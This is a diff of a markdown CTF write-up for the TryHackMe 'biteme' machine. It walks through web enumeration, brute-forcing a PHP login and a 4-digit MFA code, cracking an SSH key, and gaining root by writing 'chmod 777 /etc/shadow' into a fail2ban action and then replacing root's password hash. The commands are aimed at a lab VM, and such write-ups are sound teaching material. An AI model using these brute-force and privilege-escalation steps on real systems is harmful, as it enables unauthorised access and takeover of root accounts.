@@ -14,13 +14,14 @@ The creator is [fire015](https://tryhackme.com/p/fire015).
 Let's start by launching the **VM** and getting the **IP** address, which in our case was `10.10.21.12`.
 
 First step of enumerating boxes should be **nmap** scanning all of the available ports (`-p-` switch), and getting the info from running services on the box. The `-A` switch enables "aggressive scanning", which gets OS detection, version + script scanning, and traceroute.
-```
+
+```zsh
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ sudo nmap -A -p- -T4 -vvv -oX initialscan.xml 10.10.21.12
 ```
 Based on the output, the box only has 2 ports open:
 
-```
+```zsh
 Scanned at 2022-03-12 01:12:38 EET for 43s
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE REASON         VERSION
@@ -54,7 +55,7 @@ Often **CTF** boxes hide some sort of information in the **HTML** comments in th
 
 Time to enumerate the server for any interesting directories by fuzzing the webserver root. This can be done with many tools, such as **ffuf**, **wfuzz**, **Burp**, or **gobuster** (used here). Low-hanging fruit can usually be found quickly with the `common.txt` wordlist:
 
-```
+```zsh
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ gobuster -w /usr/share/wordlists/dirb/common.txt dir -u http://10.10.21.12/ 
 ===============================================================
@@ -91,7 +92,7 @@ So it seems like bruteforcing the login is out of the question, since we would n
 
 Time to fuzz the `/console` endpoint with **gobuster** again for additional directories. 
 
-```
+```zsh
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ gobuster -w /usr/share/wordlists/dirb/common.txt dir -u http://10.10.21.12/console/
 ===============================================================
@@ -123,7 +124,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 `/robots.txt` was a dead end. `/securimage`, however, contains a directory listing with many interesting files and directories:
 
-```  
+```
 Index of /console/securimage
 [ICO]	Name	Last modified	Size	Description
 [PARENTDIR]	Parent Directory	 	- 	 
@@ -168,7 +169,7 @@ Let's go back to the `/console` endpoint, and take a look at the **HTML** source
 
 There seems to be a peculiar script:
 
-```  
+```js
     <script>
       function handleSubmit() {
         eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
@@ -195,7 +196,7 @@ The magic box takes us to the [official site of **php**](https://www.php.net/man
 
 A-ha! Did jason give us a way to view the underlying **php** code of the server? Let's check by requesting the console endpoint with the `.phps` extension:
 
-``` 
+```php
 http://10.10.21.12/console/index.phps
 
 <?php
@@ -257,7 +258,7 @@ if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code'
 
 Jackpot! Seems like normal **php** login code. As usual for the language, there are additional included files. `http://10.10.21.12/console/functions.phps`:
 
-``` 
+```php
  <?php
 include('config.php');
 
@@ -277,7 +278,7 @@ function is_valid_pwd($pwd) {
 
 Ok... Very weird implementation. Before breaking it down, let's also take a look at the config file in `http://10.10.21.12/console/config.phps`:
 
-``` 
+```php
  <?php
 
 define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 
@@ -287,7 +288,7 @@ It seems like there's no real database implementation for login, instead it's do
 
 The username function (`is_valid_user`) takes the supplied **POST** parameter `$user`, and converts it into **hex**, which is then checked against the `LOGIN_USER` string found in `config.php`. By reverting the process, we can find out which username is correct:
 
-``` 
+```zsh
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ echo '6a61736f6e5f746573745f6163636f756e74' | xxd -r -p
 jason_test_account    
@@ -299,7 +300,7 @@ Now, the password function (`is_valid_pwd`) - again, takes the supplied **POST**
 
 Some expert password crackers might have multiple rainbow tables at their disposal, where they could simply grep for '`\.001$`', but unfortunately we don't have that luxury. Thus, let's build a quick **Python** script to go through the classic `rockyou` list, hash it line by line with **MD5**, and if the hash ends in `001`, give us the plaintext password.
 
-``` 
+```python
 import hashlib
 
 def hash_md5(word):
@@ -316,7 +317,7 @@ with open("/usr/share/wordlists/rockyou.txt" , "r") as file:	# harcoded rockyou 
 
 When the code above is ran with `python3`, we get a bunch of passwords we can use:
 
-``` 
+```zsh
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ python3 001.py 
 Found password: violet
@@ -344,7 +345,7 @@ After logging in, we're met with an **MFA** authentication screen.
 
 How would we get through this? It looks like the credentials we supplied before are saved as cookies (in plaintext no less, come on Jason!), and there's no more **CAPTCHAs** for the **MFA** code.
 
-``` 
+```http
 POST /console/mfa.php HTTP/1.1
 Host: 10.10.21.12
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
@@ -364,7 +365,7 @@ code=1234
 
 The **php** file syntax highlighting trick unfortunately didn't work for the `mfa.php` file. Thus we should probably bruteforce this part! The code is only 4 digits. First we need a wordlist containing all possible 4 digit combinations. A quick **bash** script accomplishes this:
 
-``` 
+```zsh 
 # for loop for all 4 digit combinations, direct to txt file
 
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
@@ -379,7 +380,7 @@ The **php** file syntax highlighting trick unfortunately didn't work for the `mf
 
 Now, we can use **wfuzz** to bruteforce all 10000 **PINs**. Since the web application returns an **HTTP** code of `200`, even if the code is incorrect, we need a baseline regarding when the code is wrong:
 
-``` 
+```zsh 
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ wfuzz -c -z file,pins.txt -u http://10.10.21.12/console/mfa.php -d "code=FUZZ" -H "Cookie: PHPSESSID=ng75estd5tfgpn0k8je4sqi77m; user=jason_test_account; pwd=BABYFACE" 
 ********************************************************
@@ -407,7 +408,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 We could use multiple switches for filtering out the incorrect payloads, but let's use "**chars**" for this one. Wrong payloads return a response with `1523` characters, so we just add the `--hh` switch:
 
-``` 
+```zsh 
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ wfuzz -c -z file,pins.txt -u http://10.10.21.12/console/mfa.php -d "code=FUZZ" -H "Cookie: PHPSESSID=ng75estd5tfgpn0k8je4sqi77m; user=jason_test_account; pwd=BABYFACE" --hh 1523
 ********************************************************
@@ -448,7 +449,7 @@ We can read it and save it to our attacking machine. A good tip to remember when
 
 Save the key and give it the correct permissions so that SSH can use it:
 
-``` 
+```zsh 
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ nano id_rsa
                                                                                                                                                               
@@ -463,7 +464,7 @@ Proc-Type: 4,ENCRYPTED
 
 **John the Ripper** has a tool called **ssh2john**, which generates a hash from the key file for us to crack.
 
-``` 
+```zsh 
 # Generate a hash file
 
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
@@ -503,7 +504,7 @@ jason@biteme:~$
 
 Time to escalate! As usual, we start by checking the low-hanging fruit: **cronjobs**, **SUID files**, **capabilities**, **backup files**, and **sudo rights**, which gave us something:
 
-``` 
+```zsh 
 jason@biteme:~$ sudo -l
 Matching Defaults entries for jason on biteme:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -515,7 +516,7 @@ User jason may run the following commands on biteme:
 
 We can issue any commands as `fred`. Let's change to fred's account and enumerate the same things from their account:
 
-``` 
+```zsh 
 jason@biteme:~$ sudo -u fred /bin/bash
 fred@biteme:~$ sudo -l
 Matching Defaults entries for fred on biteme:
@@ -531,14 +532,14 @@ By doing a bit of external research, we found [a brilliant writeup](https://grum
 
 The gist of the exploit is that if a low-level user has write access to `/etc/fail2ban/action.d/iptables-multiport.conf` file containing **fail2ban** rules, the **fail2ban** daemon running as `root` can execute any commands set in the conf file. Let's check if we have access:
 
-``` 
+```zsh 
 fred@biteme:~$ ls -lpah /etc/fail2ban/action.d/iptables-multiport.conf
 -rw-r--r-- 1 fred root 1.4K Nov 13 13:38 /etc/fail2ban/action.d/iptables-multiport.conf
 ``` 
 
 Not only do we have write access, the file itself is owned by us! Or fred, rather. As per **Grumpy Geek**'s writeup, we can now add any command to the "`actionban`" variable, and have it executed when someone tries to bruteforce **SSH**. The easy route is just to change the holy grail of **Linux** privilege files, `/etc/shadow`, to be readable and writable for everyone. `/etc/shadow` contains the users and password hashes of any **Linux** system, and write access to it means we can set any password for any user, including `root`.
 
-``` 
+```zsh 
 fred@biteme:~$ nano /etc/fail2ban/action.d/iptables-multiport.conf
 
 <snipped for space>
@@ -552,20 +553,20 @@ actionban = chmod 777 /etc/shadow
 
 Let's save the file and restart the **fail2ban** service for the changes to take effect.
 
-``` 
+```zsh 
 fred@biteme:~$ sudo /bin/systemctl restart fail2ban
 ``` 
 
 Checking `/etc/shadow` permissions before the rule is activated:
 
-``` 
+```zsh 
 fred@biteme:~$ ls -lpah /etc/shadow
 -rw-r----- 1 root shadow 954 Nov 13 17:18 /etc/shadow
 ``` 
 
 The permissions are as they should be. Now, to activate the **fail2ban** rule, we need to bruteforce **SSH** back on our attacking machine:
 
-``` 
+```zsh 
 ┌──(lassi㉿kali)-[~/tryhackme/biteme]
 └─$ hydra -l fail2exploit -P /usr/share/wordlists/rockyou.txt ssh://10.10.21.12  
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -579,19 +580,21 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-12 17:02:
 The username (`-l`) and wordlist (`-P`) don't really matter here, as we're not trying to successfully bruteforce our way in anyway. Let's let it run for a while and then cancel with `Ctrl+C`.
 Back on the victim machine, how are the `/etc/shadow` permissions now?
 
-``` 
+```zsh 
 fred@biteme:~$ ls -lpah /etc/shadow
 -rwxrwxrwx 1 root shadow 954 Nov 13 17:18 /etc/shadow
 ``` 
 
 This means that we have full access to the file. There's multiple things we could do now, but a simple thing to do is to generate a new password for the `root` user:
-``` 
+
+```zsh 
 fred@biteme:~$ openssl passwd -6 -salt xyz pwned
 $6$xyz$5I4IoAWqNNcGCYvBCeIz0UZr5NoOPvvHrwR9B1AX7.1fYnHX3clTDW9YRVi3TYivXiJ8Mb8clrGt7.gTxZGXb1
 ``` 
 
 And add the hash to `/etc/shadow` for the `root` user:
-``` 
+
+```zsh 
 fred@biteme:~$ nano /etc/shadow
 root:$6$xyz$5I4IoAWqNNcGCYvBCeIz0UZr5NoOPvvHrwR9B1AX7.1fYnHX3clTDW9YRVi3TYivXiJ8Mb8clrGt7.gTxZGXb1:18885:0:99999:7:::
 daemon:*:18885:0:99999:7:::
@@ -601,7 +604,7 @@ bin:*:18885:0:99999:7:::
 
 Now we can log in as the `root` user with our new password and read the root flag:
 
-``` 
+```zsh 
 fred@biteme:~$ su -
 Password: 
 root@biteme:~# whoami
